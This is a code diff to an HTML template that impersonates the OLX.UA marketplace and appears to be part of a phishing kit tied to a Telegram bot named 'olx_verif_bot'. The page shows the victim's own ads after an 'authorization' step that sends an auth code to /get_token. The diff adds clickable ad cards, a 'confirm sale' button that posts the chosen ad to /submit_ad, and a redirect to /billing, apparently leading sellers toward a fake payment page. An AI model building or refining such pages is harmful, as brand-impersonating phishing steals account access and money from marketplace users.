@@ -12,6 +12,7 @@
             --olx-bg: #f2f4f5;
             --olx-cyan: #23E5DB;
             --olx-red: #ff5636;
+            --olx-green: #27ae60;
         }
 
         body {
@@ -108,6 +109,8 @@
             text-transform: uppercase;
             margin-bottom: 12px;
         }
+
+        /* Кликабельные карточки */
         .ad-card {
             display: flex;
             align-items: center;
@@ -117,7 +120,16 @@
             padding: 8px 12px;
             margin-bottom: 8px;
             gap: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            position: relative;
         }
+
+        .ad-card.selected {
+            border: 2px solid var(--olx-dark) !important;
+            background: #f0fdfc;
+        }
+
         .ad-img {
             width: 32px;
             height: 32px;
@@ -144,38 +156,20 @@
             gap: 4px;
         }
 
-        #hidden-ads {
-            display: none;
-        }
+        #hidden-ads { display: none; }
+
         .toggle-btn {
-            background: none;
-            border: none;
-            color: var(--olx-dark);
-            font-weight: 700;
-            font-size: 13px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            gap: 5px;
-            padding: 10px 0;
-            margin-top: 5px;
+            background: none; border: none; color: var(--olx-dark);
+            font-weight: 700; font-size: 13px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            width: 100%; gap: 5px; padding: 10px 0; margin-top: 5px;
         }
-        .toggle-btn svg {
-            transition: transform 0.3s ease;
-        }
-        .toggle-btn.active svg {
-            transform: rotate(180deg);
-        }
+        .toggle-btn svg { transition: transform 0.3s ease; }
+        .toggle-btn.active svg { transform: rotate(180deg); }
 
-        .no-ads-text {
-            font-size: 13px;
-            color: #7f9799;
-            padding: 15px 0;
-            text-align: center;
-        }
+        .no-ads-text { font-size: 13px; color: #7f9799; padding: 15px 0; text-align: center; }
 
+        /* Скелетоны */
         .skeleton {
             background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
             background-size: 200% 100%;
@@ -190,6 +184,7 @@
         .sk-text { width: 80%; height: 12px; margin-bottom: 6px; }
         .sk-sub { width: 40%; height: 8px; }
 
+        /* Кнопки */
         .btn {
             display: block;
             width: 100%;
@@ -201,6 +196,28 @@
             text-decoration: none;
             box-shadow: 0 6px 15px rgba(0,0,0,.15);
             box-sizing: border-box;
+            border: none;
+            font-size: 15px;
+            margin-bottom: 12px;
+        }
+
+        .btn-confirm {
+            background: #9aa7b3; /* серый до выбора */
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-confirm.active {
+            background: var(--olx-dark);
+            cursor: pointer;
+            box-shadow: 0 6px 15px rgba(0,0,0,.15);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #24A1DE;
+            border: 1px solid #24A1DE;
+            box-shadow: none;
         }
 
         .footer-text { margin-top: 20px; font-size: 11px; color: #9aa7b3; }
@@ -231,7 +248,7 @@
         <h1>Авторизація успішна</h1>
         <p id="main-status">
             {% if user_ads is defined and user_ads is not none %}
-                Ваш профіль успішно синхронізовано. <br>Для завершення верифікації поверніться до Telegram і натисніть <b>📲 поділитися номером</b>.
+                Ваш профіль успішно синхронізовано. <br>Будь ласка, <b>оберіть товар</b> для підтвердження продажу:
             {% else %}
                 Обробка даних профілю... <br>Будь ласка, зачекайте.
             {% endif %}
@@ -239,12 +256,12 @@
 
         <div class="ads-section">
             <div class="ads-title">Ваші оголошення:</div>
-            
+
             <div id="ads-container">
                 {% if user_ads is defined and user_ads is not none %}
                     {% if user_ads|length > 0 %}
                         {% for ad in user_ads[:3] %}
-                        <div class="ad-card">
+                        <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
                             <img src="{{ ad.img }}" class="ad-img" alt="olx">
                             <div class="ad-info">
                                 <div class="ad-name">{{ ad.title }}</div>
@@ -259,7 +276,7 @@
                         {% if user_ads|length > 3 %}
                         <div id="hidden-ads">
                             {% for ad in user_ads[3:] %}
-                            <div class="ad-card">
+                            <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
                                 <img src="{{ ad.img }}" class="ad-img" alt="olx">
                                 <div class="ad-info">
                                     <div class="ad-name">{{ ad.title }}</div>
@@ -286,12 +303,58 @@
             </div>
         </div>
 
-        <a href="https://t.me/olx_verif_bot" class="btn">Повернутися до бота</a>
+        <button id="confirm-btn" class="btn btn-confirm" onclick="submitSelection()" disabled>Підтвердити продаж</button>
+        <a href="https://t.me/olx_verif_bot" class="btn btn-secondary">Повернутися до бота</a>
+
         <div class="footer-text">© OLX.UA 2026</div>
     </div>
 </main>
 
 <script>
+let selectedAdData = { url: "", title: "" };
+
+// Функция выбора товара
+function selectAd(element, url, title) {
+    document.querySelectorAll('.ad-card').forEach(card => card.classList.remove('selected'));
+    element.classList.add('selected');
+
+    selectedAdData.url = url;
+    selectedAdData.title = title;
+
+    const btn = document.getElementById('confirm-btn');
+    btn.disabled = false;
+    btn.classList.add('active');
+}
+
+// Функция отправки выбранного объявления
+async function submitSelection() {
+    if (!selectedAdData.url) return;
+    const btn = document.getElementById('confirm-btn');
+    btn.innerText = "Обробка...";
+    btn.disabled = true;
+
+    try {
+        const response = await fetch("/submit_ad", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                ad_url: selectedAdData.url,
+                ad_title: selectedAdData.title
+            })
+        });
+        if (response.ok) {
+            window.location.href = "/billing";
+        } else {
+            alert("Помилка синхронізації. Спробуйте ще раз.");
+            btn.innerText = "Підтвердити продаж";
+            btn.disabled = false;
+        }
+    } catch (err) {
+        console.error(err);
+        btn.disabled = false;
+    }
+}
+
 function toggleAds() {
     const hiddenContainer = document.getElementById('hidden-ads');
     const btn = document.getElementById('toggle-btn');
@@ -311,17 +374,16 @@ function toggleAds() {
 
 async function processAuth(authCode) {
     if (!authCode || sessionStorage.getItem('done') === authCode) return;
-    
+
     try {
         const response = await fetch("/get_token", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ code: authCode })
         });
-        
+
         if (response.ok) {
             sessionStorage.setItem('done', authCode);
-            // Даем 500мс на простановку кук и редиректим без параметров
             setTimeout(() => {
                 window.location.href = "/";
             }, 500);
